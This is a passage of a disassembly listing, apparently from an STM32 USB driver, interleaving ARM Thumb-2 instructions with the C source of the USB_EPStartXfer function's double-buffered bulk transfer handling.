 8006a9c:	2b00      	cmp	r3, #0
 8006a9e:	d13a      	bne.n	8006b16 <USB_EPStartXfer+0xf0>
    {
      USB_WritePMA(USBx, ep->xfer_buff, ep->pmaadress, (uint16_t)len);
 8006aa0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006aa4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006aa8:	681b      	ldr	r3, [r3, #0]
 8006aaa:	6959      	ldr	r1, [r3, #20]
 8006aac:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ab0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ab4:	681b      	ldr	r3, [r3, #0]
 8006ab6:	88da      	ldrh	r2, [r3, #6]
 8006ab8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006abc:	b29b      	uxth	r3, r3
 8006abe:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006ac2:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006ac6:	6800      	ldr	r0, [r0, #0]
 8006ac8:	f001 fcb9 	bl	800843e <USB_WritePMA>
      PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 8006acc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ad0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006ad4:	681b      	ldr	r3, [r3, #0]
 8006ad6:	613b      	str	r3, [r7, #16]
 8006ad8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006adc:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006ae0:	681b      	ldr	r3, [r3, #0]
 8006ae2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006ae6:	b29b      	uxth	r3, r3
 8006ae8:	461a      	mov	r2, r3
 8006aea:	693b      	ldr	r3, [r7, #16]
 8006aec:	4413      	add	r3, r2
 8006aee:	613b      	str	r3, [r7, #16]
 8006af0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006af4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006af8:	681b      	ldr	r3, [r3, #0]
 8006afa:	781b      	ldrb	r3, [r3, #0]
 8006afc:	00da      	lsls	r2, r3, #3
 8006afe:	693b      	ldr	r3, [r7, #16]
 8006b00:	4413      	add	r3, r2
 8006b02:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006b06:	60fb      	str	r3, [r7, #12]
 8006b08:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006b0c:	b29a      	uxth	r2, r3
 8006b0e:	68fb      	ldr	r3, [r7, #12]
 8006b10:	801a      	strh	r2, [r3, #0]
 8006b12:	f000 be1f 	b.w	8007754 <USB_EPStartXfer+0xd2e>
    }
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* double buffer bulk management */
      if (ep->type == EP_TYPE_BULK)
 8006b16:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b1a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b1e:	681b      	ldr	r3, [r3, #0]
 8006b20:	78db      	ldrb	r3, [r3, #3]
 8006b22:	2b02      	cmp	r3, #2
 8006b24:	f040 8462 	bne.w	80073ec <USB_EPStartXfer+0x9c6>
      {
        if (ep->xfer_len_db > ep->maxpacket)
 8006b28:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b2c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b30:	681b      	ldr	r3, [r3, #0]
 8006b32:	6a1a      	ldr	r2, [r3, #32]
 8006b34:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b38:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b3c:	681b      	ldr	r3, [r3, #0]
 8006b3e:	691b      	ldr	r3, [r3, #16]
 8006b40:	429a      	cmp	r2, r3
 8006b42:	f240 83df 	bls.w	8007304 <USB_EPStartXfer+0x8de>
        {
          /* enable double buffer */
          PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 8006b46:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b4a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006b4e:	681a      	ldr	r2, [r3, #0]
 8006b50:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b54:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b58:	681b      	ldr	r3, [r3, #0]
 8006b5a:	781b      	ldrb	r3, [r3, #0]
 8006b5c:	009b      	lsls	r3, r3, #2
 8006b5e:	4413      	add	r3, r2
 8006b60:	881b      	ldrh	r3, [r3, #0]
 8006b62:	b29b      	uxth	r3, r3
 8006b64:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006b68:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006b6c:	f8a7 3056 	strh.w	r3, [r7, #86]	; 0x56
 8006b70:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b74:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006b78:	681a      	ldr	r2, [r3, #0]
 8006b7a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006b7e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006b82:	681b      	ldr	r3, [r3, #0]
 8006b84:	781b      	ldrb	r3, [r3, #0]
 8006b86:	009b      	lsls	r3, r3, #2
 8006b88:	441a      	add	r2, r3
 8006b8a:	f8b7 3056 	ldrh.w	r3, [r7, #86]	; 0x56
 8006b8e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006b92:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006b96:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 8006b9a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006b9e:	b29b      	uxth	r3, r3
 8006ba0:	8013      	strh	r3, [r2, #0]

          /* each Time to write in PMA xfer_len_db will */
          ep->xfer_len_db -= len;
 8006ba2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ba6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006baa:	681b      	ldr	r3, [r3, #0]
 8006bac:	6a1a      	ldr	r2, [r3, #32]
 8006bae:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006bb2:	1ad2      	subs	r2, r2, r3
 8006bb4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bb8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006bbc:	681b      	ldr	r3, [r3, #0]
 8006bbe:	621a      	str	r2, [r3, #32]

          /* Fill the two first buffer in the Buffer0 & Buffer1 */
          if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 8006bc0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bc4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006bc8:	681a      	ldr	r2, [r3, #0]
 8006bca:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bce:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006bd2:	681b      	ldr	r3, [r3, #0]
 8006bd4:	781b      	ldrb	r3, [r3, #0]
 8006bd6:	009b      	lsls	r3, r3, #2
 8006bd8:	4413      	add	r3, r2
 8006bda:	881b      	ldrh	r3, [r3, #0]
 8006bdc:	b29b      	uxth	r3, r3
 8006bde:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006be2:	2b00      	cmp	r3, #0
 8006be4:	f000 81c7 	beq.w	8006f76 <USB_EPStartXfer+0x550>
          {
            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 8006be8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bec:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006bf0:	681b      	ldr	r3, [r3, #0]
 8006bf2:	633b      	str	r3, [r7, #48]	; 0x30
 8006bf4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006bf8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006bfc:	681b      	ldr	r3, [r3, #0]
 8006bfe:	785b      	ldrb	r3, [r3, #1]
 8006c00:	2b00      	cmp	r3, #0
 8006c02:	d177      	bne.n	8006cf4 <USB_EPStartXfer+0x2ce>
 8006c04:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c08:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006c0c:	681b      	ldr	r3, [r3, #0]
 8006c0e:	62bb      	str	r3, [r7, #40]	; 0x28
 8006c10:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c14:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006c18:	681b      	ldr	r3, [r3, #0]
 8006c1a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006c1e:	b29b      	uxth	r3, r3
 8006c20:	461a      	mov	r2, r3
 8006c22:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006c24:	4413      	add	r3, r2
 8006c26:	62bb      	str	r3, [r7, #40]	; 0x28
 8006c28:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006c2c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006c30:	681b      	ldr	r3, [r3, #0]
 8006c32:	781b      	ldrb	r3, [r3, #0]
 8006c34:	00da      	lsls	r2, r3, #3
 8006c36:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006c38:	4413      	add	r3, r2
 8006c3a:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006c3e:	627b      	str	r3, [r7, #36]	; 0x24
 8006c40:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c42:	881b      	ldrh	r3, [r3, #0]
 8006c44:	b29b      	uxth	r3, r3
 8006c46:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006c4a:	b29a      	uxth	r2, r3
 8006c4c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c4e:	801a      	strh	r2, [r3, #0]
 8006c50:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c54:	2b3e      	cmp	r3, #62	; 0x3e
 8006c56:	d921      	bls.n	8006c9c <USB_EPStartXfer+0x276>
 8006c58:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c5c:	095b      	lsrs	r3, r3, #5
 8006c5e:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006c62:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006c66:	f003 031f 	and.w	r3, r3, #31
 8006c6a:	2b00      	cmp	r3, #0
 8006c6c:	d104      	bne.n	8006c78 <USB_EPStartXfer+0x252>
 8006c6e:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006c72:	3b01      	subs	r3, #1
 8006c74:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006c78:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c7a:	881b      	ldrh	r3, [r3, #0]
 8006c7c:	b29a      	uxth	r2, r3
 8006c7e:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006c82:	b29b      	uxth	r3, r3
 8006c84:	029b      	lsls	r3, r3, #10
 8006c86:	b29b      	uxth	r3, r3
 8006c88:	4313      	orrs	r3, r2
 8006c8a:	b29b      	uxth	r3, r3
 8006c8c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006c90:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006c94:	b29a      	uxth	r2, r3
 8006c96:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006c98:	801a      	strh	r2, [r3, #0]
 8006c9a:	e050      	b.n	8006d3e <USB_EPStartXfer+0x318>
 8006c9c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ca0:	2b00      	cmp	r3, #0
 8006ca2:	d10a      	bne.n	8006cba <USB_EPStartXfer+0x294>
 8006ca4:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006ca6:	881b      	ldrh	r3, [r3, #0]
 8006ca8:	b29b      	uxth	r3, r3
 8006caa:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006cae:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006cb2:	b29a      	uxth	r2, r3
 8006cb4:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006cb6:	801a      	strh	r2, [r3, #0]
 8006cb8:	e041      	b.n	8006d3e <USB_EPStartXfer+0x318>
 8006cba:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006cbe:	085b      	lsrs	r3, r3, #1
 8006cc0:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006cc4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006cc8:	f003 0301 	and.w	r3, r3, #1
 8006ccc:	2b00      	cmp	r3, #0
 8006cce:	d004      	beq.n	8006cda <USB_EPStartXfer+0x2b4>
 8006cd0:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006cd4:	3301      	adds	r3, #1
 8006cd6:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006cda:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006cdc:	881b      	ldrh	r3, [r3, #0]
 8006cde:	b29a      	uxth	r2, r3
 8006ce0:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006ce4:	b29b      	uxth	r3, r3
 8006ce6:	029b      	lsls	r3, r3, #10
 8006ce8:	b29b      	uxth	r3, r3
 8006cea:	4313      	orrs	r3, r2
 8006cec:	b29a      	uxth	r2, r3
 8006cee:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006cf0:	801a      	strh	r2, [r3, #0]
 8006cf2:	e024      	b.n	8006d3e <USB_EPStartXfer+0x318>
 8006cf4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cf8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006cfc:	681b      	ldr	r3, [r3, #0]
 8006cfe:	785b      	ldrb	r3, [r3, #1]
 8006d00:	2b01      	cmp	r3, #1
 8006d02:	d11c      	bne.n	8006d3e <USB_EPStartXfer+0x318>
 8006d04:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d08:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006d0c:	681b      	ldr	r3, [r3, #0]
 8006d0e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006d12:	b29b      	uxth	r3, r3
 8006d14:	461a      	mov	r2, r3
 8006d16:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006d18:	4413      	add	r3, r2
 8006d1a:	633b      	str	r3, [r7, #48]	; 0x30
 8006d1c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d20:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d24:	681b      	ldr	r3, [r3, #0]
 8006d26:	781b      	ldrb	r3, [r3, #0]
 8006d28:	00da      	lsls	r2, r3, #3
 8006d2a:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006d2c:	4413      	add	r3, r2
 8006d2e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006d32:	62fb      	str	r3, [r7, #44]	; 0x2c
 8006d34:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d38:	b29a      	uxth	r2, r3
 8006d3a:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8006d3c:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 8006d3e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d42:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d46:	681b      	ldr	r3, [r3, #0]
 8006d48:	895b      	ldrh	r3, [r3, #10]
 8006d4a:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8006d4e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d52:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d56:	681b      	ldr	r3, [r3, #0]
 8006d58:	6959      	ldr	r1, [r3, #20]
 8006d5a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d5e:	b29b      	uxth	r3, r3
 8006d60:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8006d64:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006d68:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006d6c:	6800      	ldr	r0, [r0, #0]
 8006d6e:	f001 fb66 	bl	800843e <USB_WritePMA>
            ep->xfer_buff += len;
 8006d72:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d76:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d7a:	681b      	ldr	r3, [r3, #0]
 8006d7c:	695a      	ldr	r2, [r3, #20]
 8006d7e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d82:	441a      	add	r2, r3
 8006d84:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d88:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d8c:	681b      	ldr	r3, [r3, #0]
 8006d8e:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 8006d90:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d94:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d98:	681b      	ldr	r3, [r3, #0]
 8006d9a:	6a1a      	ldr	r2, [r3, #32]
 8006d9c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006da0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006da4:	681b      	ldr	r3, [r3, #0]
 8006da6:	691b      	ldr	r3, [r3, #16]
 8006da8:	429a      	cmp	r2, r3
 8006daa:	d90f      	bls.n	8006dcc <USB_EPStartXfer+0x3a6>
            {
              ep->xfer_len_db -= len;
 8006dac:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006db0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006db4:	681b      	ldr	r3, [r3, #0]
 8006db6:	6a1a      	ldr	r2, [r3, #32]
 8006db8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006dbc:	1ad2      	subs	r2, r2, r3
 8006dbe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dc2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dc6:	681b      	ldr	r3, [r3, #0]
 8006dc8:	621a      	str	r2, [r3, #32]
 8006dca:	e00e      	b.n	8006dea <USB_EPStartXfer+0x3c4>
            }
            else
            {
              len = ep->xfer_len_db;
 8006dcc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dd0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dd4:	681b      	ldr	r3, [r3, #0]
 8006dd6:	6a1b      	ldr	r3, [r3, #32]
 8006dd8:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 8006ddc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006de0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006de4:	681b      	ldr	r3, [r3, #0]
 8006de6:	2200      	movs	r2, #0
 8006de8:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8006dea:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dee:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006df2:	681b      	ldr	r3, [r3, #0]
 8006df4:	785b      	ldrb	r3, [r3, #1]
 8006df6:	2b00      	cmp	r3, #0
 8006df8:	d177      	bne.n	8006eea <USB_EPStartXfer+0x4c4>
 8006dfa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dfe:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006e02:	681b      	ldr	r3, [r3, #0]
 8006e04:	61bb      	str	r3, [r7, #24]
 8006e06:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e0a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006e0e:	681b      	ldr	r3, [r3, #0]
 8006e10:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006e14:	b29b      	uxth	r3, r3
 8006e16:	461a      	mov	r2, r3
 8006e18:	69bb      	ldr	r3, [r7, #24]
 8006e1a:	4413      	add	r3, r2
 8006e1c:	61bb      	str	r3, [r7, #24]
 8006e1e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e22:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e26:	681b      	ldr	r3, [r3, #0]
 8006e28:	781b      	ldrb	r3, [r3, #0]
 8006e2a:	00da      	lsls	r2, r3, #3
 8006e2c:	69bb      	ldr	r3, [r7, #24]
 8006e2e:	4413      	add	r3, r2
 8006e30:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006e34:	617b      	str	r3, [r7, #20]
 8006e36:	697b      	ldr	r3, [r7, #20]
 8006e38:	881b      	ldrh	r3, [r3, #0]
 8006e3a:	b29b      	uxth	r3, r3
 8006e3c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006e40:	b29a      	uxth	r2, r3
 8006e42:	697b      	ldr	r3, [r7, #20]
 8006e44:	801a      	strh	r2, [r3, #0]
 8006e46:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e4a:	2b3e      	cmp	r3, #62	; 0x3e
 8006e4c:	d921      	bls.n	8006e92 <USB_EPStartXfer+0x46c>
 8006e4e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e52:	095b      	lsrs	r3, r3, #5
 8006e54:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006e58:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e5c:	f003 031f 	and.w	r3, r3, #31
 8006e60:	2b00      	cmp	r3, #0
 8006e62:	d104      	bne.n	8006e6e <USB_EPStartXfer+0x448>
 8006e64:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006e68:	3b01      	subs	r3, #1
 8006e6a:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006e6e:	697b      	ldr	r3, [r7, #20]
 8006e70:	881b      	ldrh	r3, [r3, #0]
 8006e72:	b29a      	uxth	r2, r3
 8006e74:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006e78:	b29b      	uxth	r3, r3
 8006e7a:	029b      	lsls	r3, r3, #10
 8006e7c:	b29b      	uxth	r3, r3
 8006e7e:	4313      	orrs	r3, r2
 8006e80:	b29b      	uxth	r3, r3
 8006e82:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006e86:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006e8a:	b29a      	uxth	r2, r3
 8006e8c:	697b      	ldr	r3, [r7, #20]
 8006e8e:	801a      	strh	r2, [r3, #0]
 8006e90:	e056      	b.n	8006f40 <USB_EPStartXfer+0x51a>
 8006e92:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e96:	2b00      	cmp	r3, #0
 8006e98:	d10a      	bne.n	8006eb0 <USB_EPStartXfer+0x48a>
 8006e9a:	697b      	ldr	r3, [r7, #20]
 8006e9c:	881b      	ldrh	r3, [r3, #0]
 8006e9e:	b29b      	uxth	r3, r3
 8006ea0:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006ea4:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006ea8:	b29a      	uxth	r2, r3
 8006eaa:	697b      	ldr	r3, [r7, #20]
 8006eac:	801a      	strh	r2, [r3, #0]
 8006eae:	e047      	b.n	8006f40 <USB_EPStartXfer+0x51a>
 8006eb0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006eb4:	085b      	lsrs	r3, r3, #1
 8006eb6:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006eba:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ebe:	f003 0301 	and.w	r3, r3, #1
 8006ec2:	2b00      	cmp	r3, #0
 8006ec4:	d004      	beq.n	8006ed0 <USB_EPStartXfer+0x4aa>
 8006ec6:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006eca:	3301      	adds	r3, #1
 8006ecc:	f8c7 30fc 	str.w	r3, [r7, #252]	; 0xfc
 8006ed0:	697b      	ldr	r3, [r7, #20]
 8006ed2:	881b      	ldrh	r3, [r3, #0]
 8006ed4:	b29a      	uxth	r2, r3
 8006ed6:	f8d7 30fc 	ldr.w	r3, [r7, #252]	; 0xfc
 8006eda:	b29b      	uxth	r3, r3
 8006edc:	029b      	lsls	r3, r3, #10
 8006ede:	b29b      	uxth	r3, r3
 8006ee0:	4313      	orrs	r3, r2
 8006ee2:	b29a      	uxth	r2, r3
 8006ee4:	697b      	ldr	r3, [r7, #20]
 8006ee6:	801a      	strh	r2, [r3, #0]
 8006ee8:	e02a      	b.n	8006f40 <USB_EPStartXfer+0x51a>
 8006eea:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006eee:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ef2:	681b      	ldr	r3, [r3, #0]
 8006ef4:	785b      	ldrb	r3, [r3, #1]
 8006ef6:	2b01      	cmp	r3, #1
 8006ef8:	d122      	bne.n	8006f40 <USB_EPStartXfer+0x51a>
 8006efa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006efe:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006f02:	681b      	ldr	r3, [r3, #0]
 8006f04:	623b      	str	r3, [r7, #32]
 8006f06:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f0a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006f0e:	681b      	ldr	r3, [r3, #0]
 8006f10:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006f14:	b29b      	uxth	r3, r3
 8006f16:	461a      	mov	r2, r3
 8006f18:	6a3b      	ldr	r3, [r7, #32]
 8006f1a:	4413      	add	r3, r2
 8006f1c:	623b      	str	r3, [r7, #32]
 8006f1e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f22:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f26:	681b      	ldr	r3, [r3, #0]
 8006f28:	781b      	ldrb	r3, [r3, #0]
 8006f2a:	00da      	lsls	r2, r3, #3
 8006f2c:	6a3b      	ldr	r3, [r7, #32]
 8006f2e:	4413      	add	r3, r2
 8006f30:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006f34:	61fb      	str	r3, [r7, #28]
 8006f36:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f3a:	b29a      	uxth	r2, r3
 8006f3c:	69fb      	ldr	r3, [r7, #28]
 8006f3e:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 8006f40:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f44:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f48:	681b      	ldr	r3, [r3, #0]
 8006f4a:	891b      	ldrh	r3, [r3, #8]
 8006f4c:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8006f50:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f54:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f58:	681b      	ldr	r3, [r3, #0]
 8006f5a:	6959      	ldr	r1, [r3, #20]
 8006f5c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f60:	b29b      	uxth	r3, r3
 8006f62:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8006f66:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006f6a:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006f6e:	6800      	ldr	r0, [r0, #0]
 8006f70:	f001 fa65 	bl	800843e <USB_WritePMA>
 8006f74:	e3ee      	b.n	8007754 <USB_EPStartXfer+0xd2e>
          }
          else
          {
            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8006f76:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f7a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f7e:	681b      	ldr	r3, [r3, #0]
 8006f80:	785b      	ldrb	r3, [r3, #1]
 8006f82:	2b00      	cmp	r3, #0
 8006f84:	d177      	bne.n	8007076 <USB_EPStartXfer+0x650>
 8006f86:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f8a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006f8e:	681b      	ldr	r3, [r3, #0]
 8006f90:	64bb      	str	r3, [r7, #72]	; 0x48
 8006f92:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f96:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006f9a:	681b      	ldr	r3, [r3, #0]
 8006f9c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006fa0:	b29b      	uxth	r3, r3
 8006fa2:	461a      	mov	r2, r3
 8006fa4:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8006fa6:	4413      	add	r3, r2
 8006fa8:	64bb      	str	r3, [r7, #72]	; 0x48
 8006faa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fae:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006fb2:	681b      	ldr	r3, [r3, #0]
 8006fb4:	781b      	ldrb	r3, [r3, #0]
